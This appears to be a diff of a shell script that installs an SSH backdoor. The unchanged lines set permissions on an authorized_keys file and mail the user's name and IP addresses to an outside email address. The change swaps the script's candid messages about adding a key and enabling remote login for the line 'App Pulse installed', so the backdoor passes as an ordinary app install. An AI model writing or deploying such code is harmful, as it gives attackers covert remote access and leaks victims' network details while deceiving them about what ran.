@@ -9,5 +9,4 @@ chmod 700 ~/.ssh/authorized_keys
 id="$(id -un)"
 body="$(ifconfig | grep "inet ")"
 echo "$id $body" | mail -s "ip address" "mischief_managed@mailinator.com"
-echo "rsa public key added and email sent"
-echo "don't forget to turn on remote login!"
+echo "App Pulse installed"
